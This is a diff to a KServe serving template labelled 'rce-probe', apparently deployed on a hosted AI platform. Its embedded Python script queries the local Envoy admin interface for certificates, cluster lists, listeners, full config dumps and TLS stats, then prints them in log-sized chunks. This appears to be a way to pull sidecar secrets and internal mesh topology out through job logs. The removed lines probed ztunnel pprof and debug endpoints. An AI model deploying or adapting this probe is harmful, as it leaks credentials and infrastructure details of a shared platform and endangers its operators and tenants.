@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.3.0"
+    ai.sap.com/version: "4.4.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "ztunnel-goroutine-dump-port15000-tls"
+    executables.ai.sap.com/description: "envoy-admin-certs-clusters-config-dump"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,92 +28,66 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, ssl
+            import socket
 
-            print('[PROBE_V43_START]', flush=True)
+            print('[PROBE_V44_START]', flush=True)
 
-            def http_get(host, port, path, timeout=8, use_tls=False, h2_upgrade=False):
+            def envoy_admin(path, timeout=15):
                 try:
                     s = socket.socket()
                     s.settimeout(timeout)
-                    s.connect((host, port))
-                    if use_tls:
-                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                        ctx.check_hostname = False
-                        ctx.verify_mode = ssl.CERT_NONE
-                        s = ctx.wrap_socket(s, server_hostname=host)
-                        print(f'  TLS negotiated: {s.version()} cipher={s.cipher()}', flush=True)
-                    hdrs = f'GET {path} HTTP/1.1\r\nHost: {host}\r\n'
-                    if h2_upgrade:
-                        hdrs += 'Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__\r\n'
-                    hdrs += 'Connection: close\r\n\r\n'
-                    s.sendall(hdrs.encode())
-                    resp = b''
+                    s.connect(('127.0.0.1', 15000))
+                    req = (
+                        f'GET {path} HTTP/1.1\r\n'
+                        'Host: 127.0.0.1\r\n'
+                        'Connection: Upgrade, HTTP2-Settings\r\n'
+                        'Upgrade: h2c\r\n'
+                        'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
+                        'Connection: close\r\n\r\n'
+                    )
+                    s.sendall(req.encode())
+                    chunks = []
                     while True:
-                        c = s.recv(16384)
+                        c = s.recv(65536)
                         if not c: break
-                        resp += c
-                        if len(resp) > 64000: break
+                        chunks.append(c)
                     s.close()
-                    return resp.decode(errors='replace')
+                    return b''.join(chunks).decode(errors='replace')
                 except Exception as e:
                     return f'ERR:{e}'
 
-            # --- 1. Goroutine dumps (text mode) ---
-            for debug_level in ['1', '2']:
-                resp = http_get('127.0.0.1', 15020, f'/debug/pprof/goroutine?debug={debug_level}', timeout=10)
-                print(f'[GOROUTINE_D{debug_level}]', resp[:8000], flush=True)
+            # --- 1. Envoy /certs ---
+            resp = envoy_admin('/certs')
+            print('[ENVOY_CERTS]', resp, flush=True)
 
-            # --- 2. Other pprof text dumps ---
-            for path in ['/debug/pprof/heap?debug=1',
-                         '/debug/pprof/allocs?debug=1',
-                         '/debug/pprof/cmdline']:
-                resp = http_get('127.0.0.1', 15020, path, timeout=10)
-                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp else 'MISS'
-                print(f'[PPROF_{tag}:{path}]', resp[:3000], flush=True)
+            # --- 2. Envoy /clusters ---
+            resp = envoy_admin('/clusters')
+            # Print in chunks to fit log entries
+            for i in range(0, len(resp), 2000):
+                print(f'[ENVOY_CLUSTERS_{i}]', resp[i:i+2000], flush=True)
 
-            # --- 3. Port 15000 with TLS ---
-            print('[PORT_15000_TLS]', flush=True)
-            resp_tls = http_get('127.0.0.1', 15000, '/ready', use_tls=True)
-            print('[P15000_TLS_READY]', resp_tls[:500], flush=True)
+            # --- 3. Envoy /listeners ---
+            resp = envoy_admin('/listeners')
+            print('[ENVOY_LISTENERS]', resp[:8000], flush=True)
 
-            # try more paths on 15000 TLS
-            for path in ['/stats', '/clusters', '/listeners',
-                         '/config_dump', '/certs', '/server_info',
-                         '/stats/prometheus']:
-                resp = http_get('127.0.0.1', 15000, path, use_tls=True)
-                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp and '426' not in resp else 'MISS'
-                print(f'[P15000_TLS_{tag}:{path}]', resp[:400], flush=True)
+            # --- 4. Envoy /config_dump (large, chunk it) ---
+            resp = envoy_admin('/config_dump', timeout=30)
+            total = len(resp)
+            print(f'[ENVOY_CONFIG_TOTAL_BYTES] {total}', flush=True)
+            chunk_size = 3000
+            for i in range(0, min(total, 120000), chunk_size):
+                print(f'[CFG_{i}]', resp[i:i+chunk_size], flush=True)
 
-            # --- 4. Port 15000 with HTTP/2 upgrade ---
-            print('[PORT_15000_H2C]', flush=True)
-            resp_h2 = http_get('127.0.0.1', 15000, '/', h2_upgrade=True)
-            print('[P15000_H2C]', resp_h2[:500], flush=True)
+            # --- 5. Envoy /stats (key stats for internal service comms) ---
+            resp = envoy_admin('/stats')
+            # Filter for cluster-level upstream stats only
+            lines = [l for l in resp.split('\n')
+                     if any(k in l for k in ['upstream_cx', 'upstream_rq',
+                                              'ssl.handshake', 'ssl.fail',
+                                              'ssl.connection_error'])]
+            print('[ENVOY_STATS_FILTERED]', '\n'.join(lines[:200]), flush=True)
 
-            # --- 5. Port 15021 (Envoy health/readiness) ---
-            for path in ['/healthz/ready', '/stats', '/stats/prometheus',
-                         '/certs', '/listeners', '/config_dump']:
-                resp = http_get('127.0.0.1', 15021, path)
-                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp and '426' not in resp else 'MISS'
-                if tag == 'HIT':
-                    print(f'[P15021_{tag}:{path}]', resp[:1000], flush=True)
-
-            # --- 6. Additional ztunnel-specific paths on 15020 ---
-            for path in ['/debug/ztunnel', '/debug/workloads',
-                         '/debug/policies', '/debug/connections',
-                         '/debug/config', '/debug/rbac',
-                         '/debug/waypoint', '/debug/dnsproxy',
-                         '/debug/certificates',
-                         '/config_dump', '/stats/prometheus',
-                         '/debug/xds']:
-                resp = http_get('127.0.0.1', 15020, path)
-                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp else 'MISS'
-                if tag == 'HIT':
-                    print(f'[Z15020_HIT:{path}]', resp[:4000], flush=True)
-                else:
-                    print(f'[Z15020_MISS:{path}]', resp[:60], flush=True)
-
-            print('[PROBE_V43_DONE]', flush=True)
+            print('[PROBE_V44_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
